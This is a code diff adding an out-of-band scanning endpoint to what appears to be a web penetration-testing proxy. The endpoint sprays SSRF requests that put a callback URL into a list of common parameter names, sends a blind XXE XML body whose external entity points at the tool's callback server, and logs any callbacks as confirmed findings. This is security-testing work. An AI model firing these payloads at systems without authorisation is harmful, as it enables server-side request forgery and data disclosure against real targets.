@@ -2241,6 +2241,127 @@ QByteArray ControlServer::apiResponse(const QString &method, const QString &path
         return httpJson(200, minted);
     }
 
+    // POST /api/oast/blast { url, rowId?, paramNames?: [...], xxe?: true }
+    //   Sprays out-of-band payloads at one target across multiple attack
+    //   classes -- SSRF through a battery of likely parameter names, and
+    //   blind XXE through an XML body whose external entity points at our
+    //   sink. Each payload gets its own registered token, so when ANY of
+    //   them calls back, a confirmed finding auto-appears tagged with the
+    //   attack class. This is active OOB scanning that free tools don't do
+    //   and that Burp gates behind Pro + cloud Collaborator.
+    if (path == "/api/oast/blast") {
+        if (!m_wiring.oast || !m_wiring.oast->running())
+            return okJson({{ "ok", false }, { "error", "OAST server not running" }});
+        if (!m_wiring.oastCorrelator)
+            return okJson({{ "ok", false }, { "error", "no correlator wired" }});
+        const QString url = bodyJson.value("url").toString();
+        const QUrl u(url);
+        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
+            return okJson({{ "ok", false }, { "error", "valid url required" }});
+
+        const int rowId   = bodyJson.value("rowId").toInt(0);
+        const QString host = u.host();
+        const int port     = u.port(u.scheme() == "https" ? 443 : 80);
+        const bool useTls  = (u.scheme() == "https");
+        QString basePath   = u.path().isEmpty() ? "/" : u.path();
+        const QString existingQuery = u.query();
+
+        // Curated SSRF param names. Server-side code that fetches a
+        // user-supplied URL almost always names the param one of these.
+        QStringList paramNames;
+        for (const QJsonValue &v : bodyJson.value("paramNames").toArray())
+            paramNames << v.toString();
+        if (paramNames.isEmpty())
+            paramNames = QStringList{
+                "url","uri","link","src","source","dest","destination",
+                "redirect","redirect_uri","next","return","returnUrl",
+                "callback","webhook","feed","image","imageUrl","file",
+                "path","host","domain","page","target","out","view",
+                "proxy","fetch","load","u","q",
+            };
+        if (paramNames.size() > 40) paramNames = paramNames.mid(0, 40);
+        const bool wantXxe = bodyJson.value("xxe").toBool(true);
+
+        // Build the work list synchronously (mint + register BEFORE firing
+        // so a fast callback can't outrun the registry), then fire async.
+        struct Shot { QString kind, note, token, cbUrl; QByteArray request; };
+        QList<Shot> shots;
+
+        auto registerShot = [&](const QString &kind, const QString &note,
+                                const QString &paramForOrigin) -> QJsonObject {
+            const QJsonObject tok = m_wiring.oast->mintToken();
+            Nullock::Core::OastOrigin origin;
+            origin.rowId = rowId;
+            origin.host  = host;
+            origin.param = paramForOrigin;
+            origin.url   = tok.value("pathUrl").toString();
+            origin.kind  = kind;
+            origin.note  = note;
+            m_wiring.oastCorrelator->registerToken(tok.value("token").toString(), origin);
+            return tok;
+        };
+
+        // SSRF vectors: one GET per param name, param value = callback URL.
+        for (const QString &pname : paramNames) {
+            const QJsonObject tok = registerShot("ssrf-oast",
+                                                 "param:" + pname, pname);
+            const QString cbUrl = tok.value("pathUrl").toString();
+            QString q = existingQuery;
+            if (!q.isEmpty()) q += "&";
+            q += pname + "=" + QString::fromUtf8(QUrl::toPercentEncoding(cbUrl));
+            Shot s;
+            s.kind = "ssrf-oast"; s.note = "param:" + pname;
+            s.token = tok.value("token").toString(); s.cbUrl = cbUrl;
+            s.request  = "GET " + (basePath + "?" + q).toUtf8() + " HTTP/1.1\r\n";
+            s.request += "Host: " + host.toUtf8() + "\r\n";
+            s.request += "User-Agent: Nullock/oast-blast\r\n";
+            s.request += "Accept: */*\r\nConnection: close\r\n\r\n";
+            shots.append(s);
+        }
+
+        // Blind XXE: POST an XML body whose external entity resolves to
+        // our sink. Confirmation = the target's XML parser fetched it.
+        if (wantXxe) {
+            const QJsonObject tok = registerShot("xxe-oast", "xml-external-entity", "xml-body");
+            const QString cbUrl = tok.value("pathUrl").toString();
+            QByteArray xml =
+                "<?xml version=\"1.0\"?>\r\n"
+                "<!DOCTYPE r [<!ENTITY x SYSTEM \"" + cbUrl.toUtf8() + "\">]>\r\n"
+                "<r>&x;</r>";
+            Shot s;
+            s.kind = "xxe-oast"; s.note = "xml-external-entity";
+            s.token = tok.value("token").toString(); s.cbUrl = cbUrl;
+            s.request  = "POST " + basePath.toUtf8() + " HTTP/1.1\r\n";
+            s.request += "Host: " + host.toUtf8() + "\r\n";
+            s.request += "User-Agent: Nullock/oast-blast\r\n";
+            s.request += "Content-Type: application/xml\r\n";
+            s.request += "Content-Length: " + QByteArray::number(xml.size()) + "\r\n";
+            s.request += "Connection: close\r\n\r\n";
+            s.request += xml;
+            shots.append(s);
+        }
+
+        // Fire everything async; the response returns the fired vectors so
+        // the caller can watch /api/snapshot .oast.confirmed climb.
+        QList<QByteArray> requests;
+        for (const Shot &s : shots) requests.append(s.request);
+        (void)QtConcurrent::run([host, port, useTls, requests]() {
+            Nullock::Core::HttpClient client;
+            for (const QByteArray &req : requests) {
+                client.send(host, static_cast<quint16>(port), useTls, req);
+            }
+        });
+
+        QJsonArray vectors;
+        for (const Shot &s : shots)
+            vectors.append(QJsonObject{
+                { "kind", s.kind }, { "note", s.note },
+                { "token", s.token }, { "callbackUrl", s.cbUrl } });
+        return okJson({{ "fired", static_cast<int>(shots.size()) },
+                       { "target", url },
+                       { "vectors", vectors }});
+    }
+
     // ---- Session handling rules --------------------------------------
     // POST /api/session-rules/set { rules: [SessionRule, ...] }
     if (path == "/api/session-rules/set") {
